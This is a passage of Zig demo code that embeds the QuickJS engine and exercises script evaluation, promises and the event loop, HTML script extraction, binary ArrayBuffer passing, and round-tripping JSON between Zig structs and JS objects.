    const end = std.time.nanoTimestamp();
    const total_ns = end - start;
    const total_ms = @as(f64, @floatFromInt(total_ns)) / 1_000_000.0;

    z.print("Time: {d}ms\n", .{total_ms});
    z.print("Per file: {d:.2}ms\n", .{total_ms / @as(f64, @floatFromInt(iterations))});
}
fn performance1(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== Performance Test: Large Loop 30_000 -------------------------\n\n", .{});

    const source = try std.fs.cwd().readFileAlloc(allocator, "js/performance_test.js", 1024 * 1024);
    defer allocator.free(source);

    const c_source = try allocator.dupeZ(u8, source);
    defer allocator.free(c_source);

    const val = try engine.evalModule(c_source, "performance_test.js");

    engine.ctx.freeValue(val);

    // Run Main Loop (Handles Events)
    try engine.run();

    // const body_node = z.documentRoot(engine.dom.doc);
    // try z.prettyPrint(allocator, body_node.?);
}

fn demoWorker(allocator: std.mem.Allocator, sbx: []const u8) !void {
    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Worker Thread Demo -------------------------\n\n", .{});

    // We must register the Worker class in the Main Engine
    // try JSWorker.registerWorkerClass(engine.ctx);

    const source = try std.fs.cwd().readFileAlloc(allocator, "js/main_with_worker.js", 1024 * 1024);
    defer allocator.free(source);

    const c_source = try allocator.dupeZ(u8, source);
    defer allocator.free(c_source);

    const val = try engine.evalModule(c_source, "main_with_worker.js");

    engine.ctx.freeValue(val);

    // Run Main Loop (Handles Worker messages)
    try engine.run();
}

fn first_QuickJS_test(allocator: std.mem.Allocator) !void {
    const rt = try zqjs.Runtime.init(allocator);
    defer {
        rt.runGC();
        rt.deinit();
    }

    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    z.print("\n=== Executing JavaScript simple code --------------------------------\n", .{});

    // Simple arithmetic
    {
        const js_code = "2 + 2";
        const result = try ctx.eval(
            js_code,
            "<input>",
            .{},
        );
        defer ctx.freeValue(result);

        const res_int = try ctx.toInt32(result);
        std.debug.assert(res_int == 4);
        z.print("\nJS code to execute: \n{s}\n", .{js_code});
        z.print("\nResult: ➡ {d}\n", .{res_int});
    }

    // Object getter with template literals
    {
        const js_code =
            \\const info = { name: "Zig", version: "0.15.2" };
            \\const message = `Hello from ${info.name}, version: ${info.version}`;
            \\message;
        ;
        const result = try ctx.eval(
            js_code,
            "<eval>",
            .{},
        );
        defer ctx.freeValue(result);

        const res_str = try ctx.toZString(result);
        defer ctx.freeZString(res_str);

        z.print("\nJS code to execute: \n{s}\n", .{js_code});
        z.print("\nResult: ➡ {s}\n\n", .{res_str});
    }
}

fn getValueFromQJSinZig(allocator: std.mem.Allocator) !void {
    const rt = try zqjs.Runtime.init(allocator);
    defer {
        rt.runGC();
        rt.deinit();
    }

    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    z.print("\n=== Get Int Value from QJS -> Zig and double it---------------------------\n\n", .{});

    // ctx.setAllocator(&allocator);

    // Absolutely minimal JavaScript - no DOM, no bindings
    const test_code =
        \\const x = 1 + 1;
        \\x;
    ;

    const result = try ctx.eval(
        test_code,
        "<t1>",
        .{},
    );
    defer ctx.freeValue(result);

    const res_x: i32 = try ctx.toInt32(result);
    std.debug.assert(res_x * 2 == 4);

    z.print("Double the returned int in Zig: {d}\n", .{res_x * 2});
}

// ESM Modules ----------------------------------------------------------------

fn simpleESM(allocator: std.mem.Allocator, sbx: []const u8) !void {
    z.print("\n=== ESM Module Demo --------------------------------\n\n", .{});
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    const source = std.fs.cwd().readFileAlloc(allocator, "js/solidjs/app.js", 1024 * 1024) catch |err| {
        z.print("Error: Could not find 'app.js' in current directory.\n", .{});
        return err;
    };
    defer allocator.free(source);

    try engine.runModule(source, "js/solidjs/app.js");

    try engine.run();
}

fn importModule(allocator: std.mem.Allocator) !void {
    z.print("\n=== Import Module Demo --------------------------------\n\n", .{});
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    const source = std.fs.cwd().readFileAlloc(
        allocator,
        "js/import_test.js",
        1024 * 1024,
    ) catch |err| {
        z.print("Error: Could not  find 'js/import_test.js'\n", .{});
        return err;
    };
    defer allocator.free(source);

    // Imports are resolved asynchronously
    try engine.runModule(source, "import_test.js");

    try engine.run();
}

// Execute Scripts in HTML ----------------------------------------------------
fn execute_Simple_Script_In_HTML(allocator: std.mem.Allocator) !void {
    const rt = try zqjs.Runtime.init(allocator);
    defer {
        rt.runGC();
        rt.deinit();
    }

    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();

    // Note: Don't deinit ctx here - it's owned by main() and shared across demos
    z.print("\n=== Extracting and Executing Scripts --------------------------------\n\n", .{});

    // Create HTML with embedded JavaScript
    // Note: <script> tags in <head> might be removed by the HTML parser
    const html =
        \\<!DOCTYPE html>
        \\<html>
        \\<body>
        \\  <h1>Test</h1>
        \\  <script>
        \\    function greet(name) {
        \\      return `Hello, ${name}!`;
        \\    }
        \\    // Return value is captured in ArrayList - no globalThis needed!
        \\    greet("QuickJS from Zig");
        \\  </script>
        \\  <p>Content</p>
        \\  <script>
        \\    const data = { count: 42, items: ["a", "b", "c"] };
        \\    // Return value is captured in ArrayList - no globalThis needed!
        \\    JSON.stringify(data);
        \\  </script>
        \\</body>
        \\</html>
    ;

    // parse and extract <script> contents
    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);
    const node = z.documentRoot(doc).?;
    try z.prettyPrint(allocator, node);

    // Find all <script> elements
    const scripts = try z.querySelectorAll(allocator, doc, "script");
    defer allocator.free(scripts);

    z.print("\n Found {} <script> tags\n\n", .{scripts.len});
    // Store script results in ArrayList (better than globalThis pollution)
    var script_results: std.ArrayList(z.qjs.JSValue) = .{};
    defer {
        // Free all stored JSValues
        for (script_results.items) |result| {
            ctx.freeValue(result);
        }
        script_results.deinit(allocator);
    }

    // Execute each script
    for (scripts, 0..) |script_elt, i| {
        const content = z.textContent_zc(z.elementToNode(script_elt));
        z.print("Script #{}: \n{s}\n", .{ i + 1, content });
        if (content.len > 0) {
            var buf: [20]u8 = undefined;
            const file = try std.fmt.bufPrintZ(&buf, "<script-{}>", .{i + 1});

            const result = try ctx.eval(
                content,
                file,
                .{}, // Default flags: type = .global
            );
            // Don't free result yet - we'll store it in the ArrayList

            // Check for errors
            if (z.isException(result)) {
                const exception = ctx.getException();
                defer ctx.freeValue(exception);

                const error_str = try ctx.toZString(exception);
                defer ctx.freeZString(error_str);
                z.print("Error: {s}\n", .{error_str});

                // Store undefined for failed scripts
                ctx.freeValue(result); // Free the exception immediately
            } else {
                // Store the successful result for later access
                try script_results.append(allocator, result);
            }
        }
    }

    // Now access the stored script results from ArrayList
    z.print("\n--- Script Results (from ArrayList) ---\n\n", .{});

    for (script_results.items, 0..) |result, i| {
        const result_str = try ctx.toZString(result);
        defer ctx.freeZString(result_str);
        z.print("Result of Script #{}: {s}\n", .{ i + 1, result_str });
    }

    z.print("\n", .{});
}

// EVENT LOOP =================================================================
fn promise_scope(allocator: std.mem.Allocator) !void {
    const promise_test =
        \\// Create a Promise
        \\const promise = new Promise((resolve, reject) => {
        \\  // Simulate async operation
        \\  return resolve("Promise resolved!");
        \\});
        \\
        \\let result = "pending";
        \\sendToHost(result);
        \\promise.then(value => {
        \\  console.log("[JS] Promise before:", value);
        \\  result = value;
        \\}).then(() => {
        \\  console.log("[JS] Promise final:", result);
        \\  sendToHost(result);
        \\  return result;
        \\});
    ;

    z.print("\n=== Promise & scope & returned value --------------------------\n\n", .{});

    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();
    const val2 = try engine.ctx.eval(promise_test, "<promise>", .{});
    defer engine.ctx.freeValue(val2);

    try engine.run(); // Run event loop to process promise jobs

    std.debug.assert(engine.ctx.isPromise(val2));

    const p_res = engine.ctx.promiseResult(val2);
    defer engine.ctx.freeValue(p_res);
    const res2_str = try engine.ctx.toZString(p_res);
    defer engine.ctx.freeZString(res2_str);

    try std.testing.expectEqualStrings(res2_str, "Promise resolved!");
    z.print("[Zig] Promise Result: {s}\n\n", .{res2_str});
}

fn async_task_sequence_AB(allocator: std.mem.Allocator) !void {
    const src =
        \\const runner1 = () => {
        \\  let str = '';
        \\  return new Promise((resolve, reject) => {
        \\    setTimeout(() => {
        \\        str += 'B';
        \\        resolve(str);
        \\    }, 0);
        \\    Promise.resolve().then(() => str += 'A');
        \\  });
        \\};
        \\runner1().then(res => {
        \\  console.log("[JS] :" + res);
        \\  return res;
        \\});
    ;

    z.print("\n=== Async Task Sequence 1 --------------------------------\n\n", .{});
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();
    const val = try engine.eval(src, "test.js", .global);
    try engine.run();
    defer engine.ctx.freeValue(val);

    std.debug.assert(engine.ctx.isPromise(val));

    const p_res = engine.ctx.promiseResult(val);
    defer engine.ctx.freeValue(p_res);
    const txt = try engine.ctx.toZString(p_res);
    defer engine.ctx.freeZString(txt);

    try std.testing.expectEqualSlices(u8, "AB", txt);
    z.print("[Zig] ✅expects 'AB', found: {s}\n", .{txt});
}

fn async_task_sequence_ABCDEFGH(allocator: std.mem.Allocator) !void {
    const src =
        \\const runner2 = () => {
        \\    let str = '';
        \\    return new Promise((resolve, reject) => {
        \\        setTimeout(() => str += 'B', 0);
        \\        Promise.resolve().then(() => str += 'A');
        \\        setTimeout(() => {
        \\            setTimeout(() => {
        \\                setTimeout(() => {
        \\                    str += 'H';
        \\                    resolve(str);
        \\                }, 0);
        \\                str += 'D';
        \\                Promise.resolve().then(() => str += 'E');
        \\                Promise.resolve().then(() => str += 'F');
        \\                Promise.resolve().then(() => str += 'G');
        \\            }, 0);
        \\            Promise.resolve().then(() => str += 'C');
        \\        }, 100);
        \\    });
        \\};
        \\runner2().then(res => {
        \\  console.log("[JS] " + res);
        \\  return res;
        \\});
    ;

    z.print("\n=== Async Task Sequence 2 -----------------------------------------\n\n", .{});
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    const val = try engine.eval(src, "test.js", .global);
    defer engine.ctx.freeValue(val);
    try engine.run(); // EventLoop run

    std.debug.assert(engine.ctx.isPromise(val));

    const p_res = engine.ctx.promiseResult(val);
    defer engine.ctx.freeValue(p_res);
    const txt = try engine.ctx.toZString(p_res);
    defer engine.ctx.freeZString(txt);

    try std.testing.expectEqualStrings(txt, "ABCDEFGH");

    z.print("[Zig] ✅ expects 'ABCDEFGH', found: {s}\n", .{txt});
}

// Event Loop Demo: setTimeout, setInterval, async/await ----------------------
// fn test_event_loop(allocator: std.mem.Allocator) !void {
//     z.print("\n=== Event Loop Demo: setTimeout & setInterval --------------------------\n\n", .{});

//     const engine = try ScriptEngine.init(allocator);
//     defer engine.deinit();

//     // Test 1: Simple setTimeout
//     z.print("🟢 Start a \x1b[1m setTimeout \x1b[0m of 500ms and set a Global 'count=42'\n", .{});
//     const timeout_test =
//         \\globalThis.count = 0;
//         \\start = Date.now();
//         \\var coutn = 0;
//         \\setTimeout(() => {
//         \\  globalThis.count = 42;
//         \\  console.log("🟢 Get final 'count' after setTimeout of 500ms fired: count = " + globalThis.count, "after: ", Date.now()-start, "ms");
//         \\}, 500);
//         \\globalThis.count; // Should be 0 initially
//     ;

//     const result1 = try engine.eval(timeout_test, "<timeout_test>", .global);
//     defer engine.ctx.freeValue(result1);
//     try engine.run();

//     const initial_count: i32 = try engine.ctx.toInt32(result1);

//     z.print("🟢 Get initial 'count' (before timeout): {d}\n", .{initial_count});

//     // Test 2: setInterval with clearInterval
//     z.print("\n🟡 Execute \x1b[1m setInterval \x1b[0m of 200ms with 5 iterations", .{});
//     const interval_test =
//         \\let counter = 0;
//         \\start = Date.now();
//         \\const intervalId = setInterval(() => {
//         \\  counter++;
//         \\  console.log("🟡 Got Interval tick #", counter, ", expected after ", counter * 200 , ", got after ", Date.now()-start, "ms");
//         \\  if (counter >= 5) {
//         \\    clearInterval(intervalId);
//         \\    console.log("🟡 Interval cleared; expected  after ", counter * 200, ", got after ",Date.now()-start, "ms");
//         \\  }
//         \\}, 200);
//         \\intervalId;
//     ;

//     const result2 = try engine.eval(interval_test, "<interval_test>", .global);
//     defer engine.ctx.freeValue(result2);

//     // Test 3: Multiple timers with different delays
//     z.print("\n⚪️ Start multiple timers (100ms, 300ms, 700ms)\n", .{});
//     const multiple_timers =
//         \\start = Date.now();
//         \\setTimeout(() => console.log("⚪️ Timer 1 expected after: 100ms", ", fired after: ", Date.now()-start, "ms"), 100);
//         \\setTimeout(() => console.log("⚪️ Timer 2 expected after: 300ms", ", fired after: ", Date.now()-start, "ms"), 300);
//         \\setTimeout(() => console.log("⚪️ Timer 3 expected after: 700ms", ", fired after: ", Date.now()-start, "ms"), 700);
//         \\"Timers scheduled";
//     ;

//     const result3 = try engine.eval(multiple_timers, "<multiple>", .global);
//     defer engine.ctx.freeValue(result3);

//     const scheduled_msg = z.qjs.JS_ToCString(engine.ctx.ptr, result3);
//     if (scheduled_msg != null) {
//         defer z.qjs.JS_FreeCString(engine.ctx.ptr, scheduled_msg);
//         z.print("{s}\n", .{scheduled_msg});
//     }

//     // Test 4: Async/await with setTimeout (simulating async operations)
//     z.print("\n🔵 Execute \x1b[1mAsync/await\x1b[0m mocked as a setTimeout of 900ms ---\n", .{});
//     const async_test_0 =
//         \\async function delayedGreeting(txt, ms) {
//         \\  return new Promise((resolve) => {
//         \\    setTimeout(() => resolve(`🔵 ${txt} !`), ms);
//         \\  });
//         \\}
//         \\(async () => {
//         \\  start = Date.now();
//         \\  console.log("🔵 Starting first async operation...IIEE");
//         \\  const delay = 900;
//         \\
//         \\  const msg = await delayedGreeting("Zig runs async QuickJS", delay);
//         \\  console.log("🔵 Async result ", msg, "received after ", Date.now()-start, "ms");
//         \\})();
//     ;

//     const async_test_1 =
//         \\async function delayedGreeting(txt, ms) {
//         \\  return new Promise((resolve) => {
//         \\    return setTimeout(() => resolve(`🟣 Hello, ${txt}!`), ms);
//         \\  });
//         \\}
//         \\
//         \\  start = Date.now();
//         \\  console.log("🟣 Starting second chained async operation....");
//         \\  let delay = 850;
//         \\
//         \\  delayedGreeting("Async ZiggyQuickJS", delay).then(msg => {
//         \\     console.log("🟣 Async result ", msg, "received after ", Date.now()-start, "ms");
//         \\  });
//     ;

//     const async_test_2 =
//         \\async function delayedError(ms) {
//         \\  return new Promise((_, reject) => {
//         \\    setTimeout(() => reject(new Error("🔴 Failed")), ms);
//         \\  });
//         \\}
//         \\start = Date.now();
//         \\delay = 500;
//         \\console.log("🔴 Starting failing async operation....");
//         \\
//         \\delayedError(delay).catch((err) => {
//         \\  console.log(
//         \\    "🔴 Async error received after ",
//         \\    Date.now() - start,
//         \\    "ms:",
//         \\    err.message
//         \\  );
//         \\ });
//     ;

//     // _ = async_test_0; // Avoid unused variable warning

//     const result4 = try engine.eval(async_test_0, "<async0>", .global);
//     defer engine.ctx.freeValue(result4);

//     const result5 = try engine.eval(async_test_1, "<async1>", .global);
//     defer engine.ctx.freeValue(result5);
//     const result6 = try engine.eval(async_test_2, "<async2>", .global);
//     // catch |err| {
//     //     // 1. Check if QuickJS has an exception pending
//     //     if (ctx.checkAndPrintException()) {
//     //         // This will print: "SyntaxError: Identifier 'delay' has already been declared"
//     //         return err;
//     //     }
//     //     return err; // Propagate unknown errors
//     // };
//     defer engine.ctx.freeValue(result6);

//     // Run the event loop to process all timers
//     z.print("\n[Zig] 🔄 Running event loop...\n\n", .{});
//     const now = std.time.milliTimestamp();
//     try engine.run();

//     // Verify final count value
//     const global = engine.ctx.getGlobalObject();
//     defer engine.ctx.freeValue(global);
//     const count_prop = engine.ctx.getPropertyStr(global, "count");
//     defer engine.ctx.freeValue(count_prop);

//     const final_count = try engine.ctx.toInt32(count_prop);
//     z.print("🟢 Check Global final 'count' (after setTimeout): {d}\n\n", .{final_count});

//     const elapsed = std.time.milliTimestamp() - now;
//     z.print("\n[Zig] ⏳  Event loop run completed in {d} ms\n\n", .{elapsed});
// }
// ---------------------------------------------------------------------------

// Passing data JS -> Zig via Async Script Execution
fn execute_async_Script_in_HTML_And_pass_To_Zig(allocator: std.mem.Allocator, sbx: []const u8) !void {
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    // Note: Don't deinit ctx here - it's owned by main() and shared across demos
    z.print("\n=== Executing Async Script and passing data JS -> Zig ------------------------\n\n", .{});

    // Possible use of:
    //  - 'globalThis' to pass data back and forth. Comment out in this demo.
    //  - or use `return` values.
    //  - or use `sendToHost` helper function from 'dom_bridge' to pass data back to Zig immediately.

    const html =
        \\<!DOCTYPE html>
        \\<html>
        \\<body>
        \\  <h1>Test</h1>
        \\  <script>
        \\    //globalThis.result = null; // 'global' can be used to store data
        \\    async function greet(name) {
        \\      return new Promise(resolve => setTimeout(() => resolve({message: `Hello, ${name}!`}), 1000));
        \\    }
        \\    sendToHost("⏳ Going to process async call");
        \\    greet("QuickJS from Zig")
        \\    .then(msg => {
        \\       console.log("[JS] ✅  callback received: ", JSON.stringify(msg));
        \\       //globalThis.result = msg; // store in globalThis
        \\       return msg;
        \\    })
        \\    .then((msg) => {
        \\      sendToHost("⌛️ Processed async call")
        \\      return msg;
        \\    });  
        \\  </script>
        \\  <p>Content</p>
        \\</body>
        \\</html>
    ;

    // parse and extract <script> content
    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);
    const node = z.documentRoot(doc).?;
    try z.prettyPrint(allocator, node);

    const script_elt = try z.querySelector(allocator, doc, "script");
    const content = z.textContent_zc(z.elementToNode(script_elt.?));

    // returns a Promise immediately
    const result = try engine.eval(content, "<async_script>", .module);
    defer engine.ctx.freeValue(result);

    if (z.isException(result)) {
        _ = engine.ctx.checkAndPrintException();
    }

    try engine.run(); // Run Event Loop (Resolves the Promises)

    // const last_result_str = try engine.ctx.toZString(engine.rc.last_result.?);
    // std.debug.print("Last result: {s}\n", .{last_result_str});
    // defer engine.ctx.freeZString(last_result_str);

    std.debug.assert(engine.ctx.isPromise(result));

    const state = engine.ctx.promiseState(result);
    if (state == .Rejected) {
        const reason = engine.ctx.promiseResult(result);
        defer engine.ctx.freeValue(reason);
        z.print("[Zig] ❌  Promise Rejected!\n", .{});

        // Print the actual JS error (e.g., "TypeError: ...")
        const err_str = try engine.ctx.toZString(reason);
        defer engine.ctx.freeZString(err_str);
        z.print("[Zig] ❌  Promise Rejected! Reason: {s}\n", .{err_str});
        return;
    }

    std.debug.assert(state == .Fulfilled);

    const p_res = engine.ctx.promiseResult(result);
    defer engine.ctx.freeValue(p_res);

    if (engine.ctx.isString(p_res)) {
        // Handle String Return (e.g. msg.message)
        const str = try engine.ctx.toZString(p_res);
        defer engine.ctx.freeZString(str);
        z.print("[Zig] ✅  Received String: \"{s}\"\n", .{str});
    } else if (engine.ctx.isObject(p_res)) {
        // Handle Object Return (e.g. the full msg object)
        z.print("[Zig] ✅  Received Object:\n", .{});
        try engine.ctx.inspectObject(p_res);
    } else if (engine.ctx.isNumber(p_res)) {
        // Handle Numbers
        z.print("[Zig] ✅  Received Number: {d}\n", .{try engine.ctx.toInt64(p_res)});
    } else {
        // Fallback
        z.print("[Zig] ✅  Received Other (Tag: {d})\n", .{p_res.tag});
    }

    // rt.allocator.free(rc.last_result.?);

    // [Alternatively], access data via 'globalThis'
    // const global = ctx.getGlobalObject();
    // defer ctx.freeValue(global);
    // const received_data_val = ctx.getPropertyStr(global, "result");
    // defer ctx.freeValue(received_data_val);
    // if (ctx.isNull(received_data_val) or ctx.isUndefined(received_data_val)) {
    // z.print("[Zig] ⚠️ Result is null/undefined. Did the async operation finish?\n", .{});
    // } else {
    //     const received_data_str = ctx.toZString(received_data_val) catch {
    //         z.print("[Zig] ❌ Failed to convert result to string\n", .{});
    //         return;
    //     };
    //     defer ctx.freeZString(received_data_str);
    //     z.print("\n[Zig] ✅ Final Result received in Zig via Global: {s}\n\n", .{received_data_str});
    // }
}

fn async_Script_and_pass_to_Zig(allocator: std.mem.Allocator, sbx: []const u8) !void {
    var engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Async Script and passing data JS -> Zig ------------------------\n\n", .{});

    const html =
        \\<!DOCTYPE html>
        \\<html>
        \\<body>
        \\  <h1>Test</h1>
        \\  <script>
        \\    async function greet(name) {
        \\      return new Promise(resolve => setTimeout(() => resolve({message: `Hello, ${name}!`}), 1000));
        \\    }
        \\    greet("QuickJS from Zig")
        \\    .then(_msg => {
        \\      const msg = JSON.stringify(_msg);
        \\      console.log("[JS] ✅  callback received: ", msg);
        \\      sendToHost(msg);
        \\    })
        \\  </script>
        \\  <p>Content</p>
        \\</body>
        \\</html>
    ;

    try engine.loadHTML(html);
    try engine.executeScripts(allocator, "");
    try engine.run(); // Run Event Loop (Resolves the Promises)

    // const last_result_str = try engine.ctx.toZString(engine.rc.last_result.?);
    // std.debug.print("Last result: {s}\n", .{last_result_str});
    // defer engine.ctx.freeZString(last_result_str);
}

// ----------------------------------------------------------------

fn execute_Passing_Binary_Data_from_Zig_to_JS_Async(allocator: std.mem.Allocator) !void {
    const rt = try zqjs.Runtime.init(allocator);
    defer rt.deinit();
    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();
    ctx.setAllocator(&allocator);

    var loop = try EventLoop.create(allocator, rt);
    defer loop.destroy();
    const rc = try RCtx.create(allocator, ctx, loop);
    defer rc.destroy();

    // Install Standard Libs
    var dom = try DOMBridge.init(allocator, ctx);
    defer dom.deinit();
    try dom.installAPIs();
    try loop.install(ctx);

    // --- INSTALL CUSTOM BINARY BINDING ---
    const global = ctx.getGlobalObject();
    defer ctx.freeValue(global);

    // Create the C-Function using bindAsyncBuffer
    const bin_fn = AsyncBridge.bindAsyncBuffer(
        usize,
        parseSizeArgs,
        generateBinaryDataOfNumbersModulo255,
    );

    // Install as 'generateBinaryDataOfNumbersModulo255'
    try z.utils.installFn(
        ctx,
        bin_fn,
        global,
        "getBinaryData",
        "getBinaryData",
        1,
    );

    z.print("\n=== Passing Binary Data From Zig to JS (ArrayBuffer) -------------------\n\n", .{});

    const html =
        \\<!DOCTYPE html>
        \\<body>
        \\  <script>
        \\    console.log("Requesting 1024 bytes...");
        \\    try {
        \\      getBinaryData(1024).then(buffer => {
        \\        sendToHost("Checking received binary data"); // immediate Zig notification
        \\        // 1. Verify Type
        \\        if (buffer instanceof ArrayBuffer) {
        \\          console.log("[JS] ✅  Received ArrayBuffer!");
        \\        } else {
        \\          console.log("[JS] ❌ Error: Expected ArrayBuffer, got " + typeof buffer);
        \\        }
        \\
        \\        // 2. Verify Content
        \\        console.log("Byte Length: " + buffer.byteLength);
        \\        
        \\        const view = new Uint8Array(buffer);
        \\        console.log("[JS] First byte: " + view[0]);   // Should be 0
        \\        console.log("[JS] Second byte: " + view[1]);  // Should be 1
        \\        console.log("[JS] 254th byte: " + view[254]); // Should be 254
        \\        console.log("[JS] 255th byte: " + view[255]); // Should be 0
        \\        console.log("[JS] Last byte: " + view[1023]); // Should be 1023 % 255
        \\        sendToHost("Check complete");
        \\        return "Done";
        \\      })
        \\    } catch (err) {
        \\        console.error("Error calling getBinaryData:", err);
        \\    }
        \\  </script>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);
    const script_elt = try z.querySelector(allocator, doc, "script");
    const content = z.textContent_zc(z.elementToNode(script_elt.?));

    const result = try ctx.eval(content, "<async_binary>", .{});
    defer ctx.freeValue(result);
    if (z.isException(result)) _ = ctx.checkAndPrintException();

    // Run Loop to process worker result
    try loop.run(.Script);
}

fn generateBinaryDataOfNumbersModulo255(allocator: std.mem.Allocator, size: usize) ![]u8 {
    // Allocate a buffer
    const buffer = try allocator.alloc(u8, size);

    // Fill with pattern (0, 1, 2...)
    for (buffer, 0..) |*b, i| {
        b.* = @intCast(i % 255);
    }

    return buffer;
}
fn parseSizeArgs(_: *EventLoop, ctx: zqjs.Context, args: []const zqjs.Value) !usize {
    if (args.len < 1) return error.InvalidArgs;
    var size: i32 = 0;
    if (ctx.toInt32(args[0])) |val| {
        size = val;
    } else |_| return error.InvalidArgs;

    if (size < 0) return error.InvalidArgs;
    return @intCast(size);
}

// ----------------------------------------------------------------
// A Zig struct to represente a User object
const User = struct {
    id: i32,
    username: []const u8,
    role: []const u8,
    active: bool,
};

fn jsonZStringify(allocator: std.mem.Allocator, user: User) ![:0]u8 {
    var out: std.Io.Writer.Allocating = .init(allocator);
    try std.json.Stringify.value(user, .{ .whitespace = .indent_2 }, &out.writer);
    return try out.toOwnedSliceSentinel(0);
}

fn firstJSONPass(allocator: std.mem.Allocator) !void {
    const rt = try zqjs.Runtime.init(allocator);
    defer rt.deinit();
    const ctx = zqjs.Context.init(rt);
    defer ctx.deinit();
    ctx.setAllocator(&allocator);

    // no need the full EventLoop for this sync demo,
    // but we install the console for debugging.
    const global = ctx.getGlobalObject();
    defer ctx.freeValue(global);

    const console = ctx.newObject();
    const log_fn = ctx.newCFunction(z.utils.js_consoleLog, "log", 1);
    _ = try ctx.setPropertyStr(console, "log", log_fn);
    _ = try ctx.setPropertyStr(global, "console", console);

    z.print("\n=== Zig_User{{}} -> JSON -> JS -> JSON -> Zig_User{{}} (JSON Object Passing) ------------\n\n", .{});

    // Create Zig Data
    const my_user = User{
        .id = 101,
        .username = "zig_fan",
        .role = "guest",
        .active = false,
    };

    // serailize Zig_struct into JSON_String
    const parsed = try jsonZStringify(allocator, my_user);
    defer allocator.free(parsed);

    // const json_str = try allocator.dupeZ(u8, parsed);
    // defer allocator.free(json_str);
    const json_parsed = parsed[0 .. parsed.len - 1]; // remove sentinel

    // parse JSON String -> quickJS JS_Object
    const js_obj = ctx.parseJSON(json_parsed, "<json_loader>");
    defer ctx.freeValue(js_obj);

    if (ctx.isException(js_obj)) {
        z.print("[Zig] ❌ Failed to parse JSON\n", .{});
        return;
    }

    // Call the JS Function
    const js_code =
        \\function upgradeUser(user) {
        \\    console.log("[JS]  🔹  Received user: " + JSON.stringify(user));
        \\
        \\    // Modify the object directly
        \\    user.username = user.username.toUpperCase();
        \\    user.role = "ADMIN"; 
        \\    user.active = true;
        \\    return user;
        \\}
    ;
    const eval_ret = try ctx.eval(js_code, "<init>", .{});
    ctx.freeValue(eval_ret);

    // Get the function from global scope
    const func_name = "upgradeUser";
    const func_val = ctx.getPropertyStr(global, func_name);
    defer ctx.freeValue(func_val);

    if (!ctx.isFunction(func_val)) {
        z.print("[Zig] ❌ Could not find function '{s}'\n", .{func_name});
        return;
    }

    // Call it: upgradeUser(js_obj)
    const args = [_]zqjs.Value{js_obj};
    const result_obj = ctx.call(func_val, global, &args);
    defer ctx.freeValue(result_obj);

    std.debug.assert(ctx.isObject(result_obj));

    if (ctx.isException(result_obj)) {
        _ = ctx.checkAndPrintException();
        return;
    }

    // ---------------------------------------------------------
    // STEP 5: Inspect the Result in Zig
    // ---------------------------------------------------------
    z.print("\n[Zig] 🔸  Result Object:\n", .{});

    // wrapper helper iterates over all properties
    try ctx.inspectObject(result_obj);

    const val = try ctx.jsonStringifySimple(result_obj);
    defer ctx.freeValue(val);
    const val_str = try ctx.toZString(val);
    defer ctx.freeZString(val_str);
    const re_parsed = try std.json.parseFromSlice(User, allocator, val_str, .{});
    defer re_parsed.deinit();
    std.debug.print("[Zig] ✅  User{{}}.username: {s}\n", .{re_parsed.value.username});

    // Or extract specific fields manually
    const name_prop = ctx.getPropertyStr(result_obj, "username");
    defer ctx.freeValue(name_prop);
    const name_str = try ctx.toZString(name_prop);
    defer ctx.freeZString(name_str);

    z.print("\n✅ Direct verification from JS object: Username is now '{s}'\n", .{name_str});
}

fn simplifiedJSONPass(allocator: std.mem.Allocator) !void {
    const engine = try ScriptEngine.init(allocator);
    defer engine.deinit();

    z.print("\n=== Zig_User{{}} -> JSON -> JS -> JSON -> Zig_User{{}} (JSON Object Passing) ---------------\n\n", .{});

    // Zig Data
    const my_user = User{
        .id = 101,
        .username = "zig_fan",
        .role = "guest",
        .active = false,
    };

    const js_code =
        \\function upgradeUser(user) {
        \\    console.log("[JS]  🔹 Received user " + JSON.stringify(user));
        \\    user.username = user.username.toUpperCase();
        \\    user.role = "ADMIN"; 
        \\    return user;
        \\}
    ;

    const res = try engine.eval(js_code, "init.js", .global);
    engine.ctx.freeValue(res);

    const result = try engine.call(User, "upgradeUser", my_user);
    defer result.deinit();

    const u = result.value;

    z.print("[Zig] 🔸  Returned User{{}}:\n", .{});
    inline for (std.meta.fields(User)) |f| {
        switch (f.type) {
            []const u8 => z.print("{s}: {s}\n", .{ f.name, @field(u, f.name) }),
            else => z.print("{s}: {any}\n", .{ f.name, @field(u, f.name) }),
        }
    }

    // try engine.run(); <-- for async event loop processing
}

// CSV Parser ----------------------------------------------------------------
const Product = struct {
    id: i32,
    name: []const u8,
    price: f64,
    in_stock: bool,
};

// allocate CSV string in Loop allocator
fn parseCSVArg(loop: *EventLoop, ctx: zqjs.Context, args: []const zqjs.Value) ![]u8 {
    if (args.len < 1) return error.InvalidArgs;
    // We must copy the string because the thread needs to own the memory.
    // ctx.toZString uses a buffer that might be freed by QJS GC.
    const str = try ctx.toZString(args[0]);
    defer ctx.freeZString(str);

    return loop.allocator.dupe(u8, str);
}

// 2. Worker: Calls the generic logic
fn workerParseProducts(allocator: std.mem.Allocator, csv_text: []u8) ![]Product {
    z.print("[Worker] JSON Parsing.....\n", .{});
    return parseCSV.parseCSVtoJSON(Product, allocator, csv_text);
}

fn async_CSV_JSON_Parser(allocator: std.mem.Allocator, sbx: []const u8) !void {
    const engine = try ScriptEngine.init(allocator, sbx);
    defer engine.deinit();

    z.print("\n=== Zig Native CSV_as_JSON parser worker called from JS ------------------\n\n", .{});

    // 1. Create the binding
    // bindAsyncJson takes care of serializing []Product -> JSON String
